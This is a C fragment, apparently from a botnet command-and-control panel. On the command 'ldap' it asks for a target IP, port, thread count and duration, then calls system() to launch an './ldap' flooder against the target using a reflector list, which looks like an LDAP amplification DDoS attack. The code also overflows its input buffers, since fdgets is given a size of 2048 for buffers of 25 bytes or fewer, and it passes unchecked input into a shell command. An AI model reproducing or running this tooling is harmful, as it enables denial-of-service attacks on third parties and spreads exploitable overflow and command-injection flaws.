/*
Four user inputs: [InputIP, InputPort, InputThreads, InputTime]

Process the response of each UserInput and Print to system as a command.

The '&' at the end of the function is to make our command run in the background, essentially in a 'subshell'

This certifies that the users who run this command will not have their current window freeze up
*/

if(strstr(buf, "ldap"))
{   
    char abuf[2048]; char *inputtosystem[100]; char InputIP[25]; char InputPort[6]; char InputThreads[5]; char InputTime[6];
 
    sprintf(botnet, "IP: "); 
    if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; /* Printing User Input for IP */ 
    if (fdgets(InputIP, sizeof abuf, thefd) < 1) goto end; /* Taking user input for IP */
    trim(InputIP); /* Trimming User Input for IP*/
 
    sprintf(botnet, "Port: "); 
    if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; /* Printing User input for Port */
    if (fdgets(InputPort, sizeof abuf, thefd) < 1) goto end;   /* Grabbing User Input for Port */  
    trim(InputPort); /* Trimming user input for Port */
 
    sprintf(botnet, "Threads: "); 
    if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; /* Printing User input for Threads */
    if (fdgets(InputThreads, sizeof abuf, thefd) < 1) goto end; /* Grabbing user input for Threads */
    trim(InputThreads); /* Trimming user input for Threads */
 
    sprintf(botnet, "Time: "); 
    if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;  /* Printing user input for Time*/
    if (fdgets(InputTime, sizeof abuf, thefd) < 1) goto end;  /* Grabbing user input for Time */
    trim(InputTime); /* Trimming user input for Time */
 
    sprintf(inputtosystem, "./ldap %s %s ldap.txt %s -1 %s &", InputIP, InputPort, InputThreads, InputTime); 
    system(inputtosystem); /* Sending command to server */
}
